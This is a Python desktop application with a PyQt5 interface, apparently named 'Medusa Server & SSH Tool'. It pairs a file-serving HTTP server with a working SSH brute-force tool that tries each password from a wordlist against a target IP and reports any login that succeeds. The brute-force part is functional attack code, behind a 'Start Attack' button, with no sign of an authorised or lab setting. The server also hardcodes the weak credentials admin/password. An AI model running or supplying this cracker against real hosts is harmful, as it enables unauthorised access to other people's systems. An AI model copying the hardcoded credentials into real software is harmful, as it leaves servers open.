import sys
import os
import threading
import paramiko
from base64 import b64encode
from http.server import HTTPServer, SimpleHTTPRequestHandler
from PyQt5.QtWidgets import (
    QApplication, QMainWindow, QLabel, QLineEdit, QPushButton, QTextEdit, QFileDialog, QVBoxLayout, QWidget, QProgressBar, QHBoxLayout, QTabWidget
)
from PyQt5.QtCore import QThread, pyqtSignal, Qt

# Authentication Handler for HTTP Server
class AuthHandler(SimpleHTTPRequestHandler):
    """Custom HTTP request handler with basic authentication."""
    username = "admin"
    password = "password"

    def _check_auth(self):
        """Validate Basic Authentication."""
        if 'Authorization' not in self.headers:
            self._send_auth_request()
        else:
            auth_type, encoded_creds = self.headers['Authorization'].split(' ', 1)
            if auth_type.lower() != "basic" or encoded_creds != b64encode(f"{self.username}:{self.password}".encode()).decode():
                self._send_auth_request()

    def _send_auth_request(self):
        """Send a 401 Unauthorized response."""
        self.send_response(401)
        self.send_header('WWW-Authenticate', 'Basic realm="Medusa Server"')
        self.end_headers()
        self.wfile.write(b"Authentication required")
        raise Exception("Unauthorized access")

# Medusa-like HTTP Server
class MedusaLikeServer:
    def __init__(self, directory=".", port=8080, target="0.0.0.0"):
        self.running = False
        self.directory = directory
        self.port = port
        self.target = target
        self.thread = None
        self.server = None

    def start(self):
        try:
            if not self.running:
                os.chdir(self.directory)
                self.server = HTTPServer((self.target, self.port), AuthHandler)
                self.running = True
                self.thread = threading.Thread(target=self._run_server, daemon=True)
                self.thread.start()
        except Exception as e:
            print(f"[Error] Failed to start the server: {e}")

    def stop(self):
        try:
            if self.running:
                self.running = False
                if self.server:
                    self.server.shutdown()
                    self.server.server_close()
        except Exception as e:
            print(f"[Error] Failed to stop the server: {e}")

    def _run_server(self):
        try:
            print(f"Server started on http://{self.target}:{self.port}")
            self.server.serve_forever()
        except Exception as e:
            print(f"[Error] Server encountered an issue: {e}")

# Brute Force Worker (SSH Login)
class BruteForceWorker(QThread):
    progress = pyqtSignal(int)
    log = pyqtSignal(str)

    def __init__(self, target_ip, username, passwords):
        super().__init__()
        self.target_ip = target_ip
        self.username = username
        self.passwords = passwords

    def run(self):
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        total = len(self.passwords)

        for index, password in enumerate(self.passwords):
            password = password.strip()
            try:
                self.log.emit(f"[Attempt] Trying password: {password}")
                client.connect(hostname=self.target_ip, username=self.username, password=password, timeout=5)
                self.log.emit(f"[Success] Username: {self.username}, Password: {password}")
                client.close()
                self.progress.emit(100)
                return
            except paramiko.AuthenticationException:
                self.log.emit("[Failed] Authentication failed.")
            except paramiko.SSHException as e:
                self.log.emit(f"[Error] SSH error: {e}")
            except Exception as e:
                self.log.emit(f"[Error] Unexpected error: {e}")
            finally:
                self.progress.emit(int((index + 1) / total * 100))

        self.log.emit("[Info] All attempts failed.")
        client.close()

# Server Management Window
class ServerWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.server = MedusaLikeServer()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Server Management")
        layout = QVBoxLayout()

        self.status_label = QLabel("Server Status: Stopped")
        self.dir_label = QLabel("Serving Directory: None")
        self.port_label = QLabel("Port: 8080")
        self.target_label = QLabel("Target: 0.0.0.0")

        self.port_input = QLineEdit()
        self.port_input.setPlaceholderText("Enter Port (default: 8080)")

        self.target_input = QLineEdit()
        self.target_input.setPlaceholderText("Enter Target Address (default: 0.0.0.0)")

        self.dir_button = QPushButton("Set Directory")
        self.start_button = QPushButton("Start Server")
        self.stop_button = QPushButton("Stop Server")

        layout.addWidget(self.status_label)
        layout.addWidget(self.dir_label)
        layout.addWidget(self.port_label)
        layout.addWidget(self.target_label)
        layout.addWidget(self.port_input)
        layout.addWidget(self.target_input)
        layout.addWidget(self.dir_button)
        layout.addWidget(self.start_button)
        layout.addWidget(self.stop_button)

        self.dir_button.clicked.connect(self.set_directory)
        self.start_button.clicked.connect(self.start_server)
        self.stop_button.clicked.connect(self.stop_server)

        self.setLayout(layout)

    def set_directory(self):
        directory = QFileDialog.getExistingDirectory(self, "Select Directory")
        if directory:
            self.server.directory = directory
            self.dir_label.setText(f"Serving Directory: {directory}")

    def start_server(self):
        port = self.port_input.text()
        target = self.target_input.text()

        if port.isdigit():
            self.server.port = int(port)
            self.port_label.setText(f"Port: {port}")
        else:
            self.port_label.setText("Port: 8080 (default)")

        if target.strip():
            self.server.target = target
            self.target_label.setText(f"Target: {target}")
        else:
            self.target_label.setText("Target: 0.0.0.0 (default)")

        if not self.server.running:
            self.server.start()
            self.status_label.setText(f"Server Status: Running at http://{self.server.target}:{self.server.port}")
        else:
            self.status_label.setText("Server Status: Already Running")

    def stop_server(self):
        if self.server.running:
            self.server.stop()
            self.status_label.setText("Server Status: Stopped")
        else:
            self.status_label.setText("Server Status: Already Stopped")

# SSH Brute Force Tool Window
class BruteForceWindow(QWidget):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("SSH Brute Force Tool")
        layout = QVBoxLayout()

        self.label_ip = QLabel("Target IP:")
        self.input_ip = QLineEdit()
        self.label_username = QLabel("Username:")
        self.input_username = QLineEdit()
        self.label_password_file = QLabel("Password File:")
        self.input_password_file = QLineEdit()
        self.button_browse = QPushButton("Browse")
        self.button_browse.clicked.connect(self.browse_file)

        self.label_log = QLabel("Output Log:")
        self.text_log = QTextEdit()
        self.text_log.setReadOnly(True)

        self.progress_bar = QProgressBar()
        self.button_start = QPushButton("Start Attack")
        self.button_start.clicked.connect(self.start_attack)

        layout.addWidget(self.label_ip)
        layout.addWidget(self.input_ip)
        layout.addWidget(self.label_username)
        layout.addWidget(self.input_username)
        layout.addWidget(self.label_password_file)
        layout.addWidget(self.input_password_file)
        layout.addWidget(self.button_browse)
        layout.addWidget(self.label_log)
        layout.addWidget(self.text_log)
        layout.addWidget(self.progress_bar)
        layout.addWidget(self.button_start)

        self.setLayout(layout)

    def browse_file(self):
        file_name, _ = QFileDialog.getOpenFileName(self, "Select Password File", "", "Text Files (*.txt);;All Files (*)")
        if file_name:
            self.input_password_file.setText(file_name)

    def start_attack(self):
        target_ip = self.input_ip.text().strip()
        username = self.input_username.text().strip()
        password_file = self.input_password_file.text().strip()

        if not target_ip or not username or not password_file:
            self.text_log.append("[Error] All fields are required.")
            return

        try:
            with open(password_file, "r") as file:
                passwords = file.readlines()
        except FileNotFoundError:
            self.text_log.append(f"[Error] Password file not found: {password_file}")
            return
        except Exception as e:
            self.text_log.append(f"[Error] Error reading password file: {e}")
            return

        self.text_log.append("[Info] Starting brute force attack...")
        self.progress_bar.setValue(0)

        self.worker = BruteForceWorker(target_ip, username, passwords)
        self.worker.log.connect(self.text_log.append)
        self.worker.progress.connect(self.progress_bar.setValue)
        self.worker.start()

# Main Application
class MainApplication(QMainWindow):
    def __init__(self):
        super().__init__()
        self.init_ui()

    def init_ui(self):
        self.setWindowTitle("Medusa Server & SSH Tool")
        self.setGeometry(200, 200, 800, 600)

        tabs = QTabWidget()
        tabs.addTab(ServerWindow(), "Server Management")
        tabs.addTab(BruteForceWindow(), "SSH Brute Force Tool")

        self.setCentralWidget(tabs)

if __name__ == "__main__":
    app = QApplication(sys.argv)
    main_app = MainApplication()
    main_app.show()
    sys.exit(app.exec_())
